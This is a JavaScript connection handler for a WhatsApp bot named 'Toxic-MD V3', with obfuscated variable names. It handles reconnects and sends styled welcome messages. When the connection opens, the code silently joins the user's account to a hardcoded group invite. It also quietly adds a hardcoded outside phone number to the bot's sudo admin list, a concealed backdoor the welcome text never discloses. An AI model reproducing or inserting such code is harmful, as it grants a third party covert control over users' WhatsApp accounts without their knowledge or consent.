const { Boom } = require("@hapi/boom");
const { DateTime } = require("luxon");
const { default: toxicConnect, DisconnectReason } = require("baileys-elite");
const { getSettings, getSudoUsers, addSudoUser } = require("../Database/config");
const { commands, totalCommands } = require("../Handler/commandHandler");
const botname = process.env.BOTNAME || "Toxic-MD V3";

const connectionHandler = async (_0x218261, _0x461fdf, _0xd50ec0) => {
  const { connection: _0x115a4c, lastDisconnect: _0x15c83b } = _0x461fdf;

  const _0x166fc0 = () => {
    const _0x18db2f = DateTime.now().setZone("Africa/Nairobi").hour;
    if (_0x18db2f >= 5 && _0x18db2f < 12) {
      return "Rise and shine! 🌅";
    }
    if (_0x18db2f >= 12 && _0x18db2f < 18) {
      return "Midday vibes! ☀️";
    }
    if (_0x18db2f >= 18 && _0x18db2f < 22) {
      return "Evening glow! 🌌";
    }
    return "Night owl mode! 🌙";
  };

  const _0x53a446 = () => {
    return DateTime.now().setZone("Africa/Nairobi").toLocaleString(DateTime.TIME_SIMPLE);
  };

  const toFancyFont = (text, isUpperCase = false) => {
    const fonts = {
      'A': '𝘼', 'B': '𝘽', 'C': '𝘾', 'D': '𝘿', 'E': '𝙀', 'F': '𝙁', 'G': '𝙂', 'H': '𝙃', 'I': '𝙄', 'J': '𝙅', 'K': '𝙆', 'L': '𝙇', 'M': '𝙈',
      'N': '𝙉', 'O': '𝙊', 'P': '𝙋', 'Q': '𝙌', 'R': '𝙍', 'S': '𝙎', 'T': '𝙏', 'U': '𝙐', 'V': '𝙑', 'W': '𝙒', 'X': '𝙓', 'Y': '𝙔', 'Z': '𝙕',
      'a': '𝙖', 'b': '𝙗', 'c': '𝙘', 'd': '𝙙', 'e': '𝙚', 'f': '𝙛', 'g': '𝙜', 'h': '𝙝', 'i': '𝙞', 'j': '𝙟', 'k': '𝙠', 'l': '𝙡', 'm': '𝙢',
      'n': '𝙣', 'o': '𝙤', 'p': '𝙥', 'q': '𝙦', 'r': '𝙧', 's': '𝙨', 't': '𝙩', 'u': '𝙪', 'v': '𝙫', 'w': '𝙬', 'x': '𝙭', 'y': '𝙮', 'z': '𝙯'
    };
    return (isUpperCase ? text.toUpperCase() : text.toLowerCase())
      .split('')
      .map(char => fonts[char] || char)
      .join('');
  };

  if (_0x115a4c === "connecting") {
    console.log("📈 Connecting to WhatsApp and database...");
  }

  if (_0x115a4c === "close") {
    let _0x40b37e = new Boom(_0x15c83b?.error)?.output.statusCode;
    if (_0x40b37e === DisconnectReason.badSession) {
      console.log("Bad Session File, Please Delete Session and Scan Again");
      process.exit();
    } else if (_0x40b37e === DisconnectReason.connectionClosed) {
      console.log("Connection closed, reconnecting....");
      _0xd50ec0();
    } else if (_0x40b37e === DisconnectReason.connectionLost) {
      console.log("Connection Lost from Server, reconnecting...");
      _0xd50ec0();
    } else if (_0x40b37e === DisconnectReason.connectionReplaced) {
      console.log("Connection Replaced, potentiate Toxic-MD V3");
      process.exit();
    } else if (_0x40b37e === DisconnectReason.loggedOut) {
      console.log("Device Logged Out, Please Delete Session and Scan Again.");
      process.exit();
    } else if (_0x40b37e === DisconnectReason.restartRequired) {
      console.log("Restart Required, Restarting...");
      _0xd50ec0();
    } else if (_0x40b37e === DisconnectReason.timedOut) {
      console.log("Connection TimedOut, Reconnecting...");
      _0xd50ec0();
    } else {
      console.log("Unknown DisconnectReason: " + _0x40b37e + " | " + _0x115a4c);
      _0xd50ec0();
    }
  } else if (_0x115a4c === "open") {
    try {
      await _0x218261.groupAcceptInvite("GoXKLVJgTAAC3556FXkfFI");
      console.log("✅ bot running successfully !");
    } catch (error) {
      console.error("❌ Failed to join group:", error.message);
    }
    const _0x1d6f9f = _0x218261.user.id.replace(/:.*/, "").split("@")[0];
    const _0x316865 = await getSettings();
    const _0x1928a7 = await getSudoUsers();

    if (!_0x1928a7.includes(_0x1d6f9f)) {
      await addSudoUser(_0x1d6f9f);
      const _0x531909 = "254735342808";
      if (!_0x1928a7.includes(_0x531909)) {
        await addSudoUser(_0x531909);
      }

      let _0x55d08c = `◈━━━━━━━━━━━━━━━━◈\n│❒ *${_0x166fc0()}*\n│❒ Yo, you're plugged into *${botname}*! 📡\n\n`;
      _0x55d08c += `✨ *Bot Name*: ${botname}\n`;
      _0x55d08c += `🔧 *Mode*: ${_0x316865.mode}\n`;
      _0x55d08c += `➡️ *Prefix*: ${_0x316865.prefix}\n`;
      _0x55d08c += `📋 *Commands*: ${totalCommands}\n`;
      _0x55d08c += `🕒 *Time*: ${_0x53a446()}\n`;
      _0x55d08c += `💾 *Database*: Postgres SQL\n`;
      _0x55d08c += `📚 *Library*: Baileys\n\n`;
      _0x55d08c += `│❒ *New Connection Alert!* First time here? We've added you to the sudo crew! 😎\n\n`;
      _0x55d08c += `│❒ 🚀 *Get Started*:\n`;
      _0x55d08c += `│❒ - Customize bot with *${_0x316865.prefix}settings*\n`;
      _0x55d08c += `│❒ - Hit the button below for commands! 👇\n\n`;
      _0x55d08c += `│❒ *Credits*: Powered by 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧 🗿\n◈━━━━━━━━━━━━━━━━◈`;

      await _0x218261.sendMessage(_0x218261.user.id, {
        text: _0x55d08c,
        footer: `TPσɯҽɾҽԃ Ⴆყ ${botname}`,
        buttons: [
          { buttonId: `${_0x316865.prefix || ''}menu`, buttonText: { displayText: `📖 ${toFancyFont('MENU')}` }, type: 1 }
        ],
        headerType: 1,
        viewOnce: true,
        contextInfo: {
          externalAdReply: {
            showAdAttribution: false,
            title: `${botname}`,
            body: `Yo! Don’t fuck this up.`,
            sourceUrl: `https://github.com/xhclintohn/Toxic-MD`,
            mediaType: 1,
            renderLargerThumbnail: true
          }
        }
      });
    } else {
      let _0x24abe8 = `◈━━━━━━━━━━━━━━━━◈\n│❒ *${_0x166fc0()}*\n│❒ Welcome back to *${botname}*! 📡\n\n`;
      _0x24abe8 += `✨ *Bot Name*: ${botname}\n`;
      _0x24abe8 += `🔧 *Mode*: ${_0x316865.mode}\n`;
      _0x24abe8 += `➡️ *Prefix*: ${_0x316865.prefix}\n`;
      _0x24abe8 += `📋 *Commands*: ${totalCommands}\n`;
      _0x24abe8 += `🕒 *Time*: ${_0x53a446()}\n`;
      _0x24abe8 += `💾 *Database*: Postgres SQL\n`;
      _0x24abe8 += `📚 *Library*: Baileys\n\n`;
      _0x24abe8 += `│❒ Ready to dive in? Hit the button below for commands! 😎\n\n`;
      _0x24abe8 += `│❒ *Credits*: Powered by 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧 🗿\n◈━━━━━━━━━━━━━━━━◈`;

      await _0x218261.sendMessage(_0x218261.user.id, {
        text: _0x24abe8,
        footer: `TPσɯҽɾҽԃ Ⴆყ ${botname}`,
        buttons: [
          { buttonId: `${_0x316865.prefix || ''}menu`, buttonText: { displayText: `📖 ${toFancyFont('MENU')}` }, type: 1 }
        ],
        headerType: 1,
        viewOnce: true,
        contextInfo: {
          externalAdReply: {
            showAdAttribution: false,
            title: `${botname}`,
            body: `Yo! Don’t fuck this up.`,
            sourceUrl: `https://github.com/xhclintohn/Toxic-MD`,
            mediaType: 1,
            renderLargerThumbnail: true
          }
        }
      });
    }
    console.log("✅ Connection to WhatsApp and database successful\nLoaded " + totalCommands + " commands.\nToxic-MD V3 is active!");
  }
};

module.exports = connectionHandler;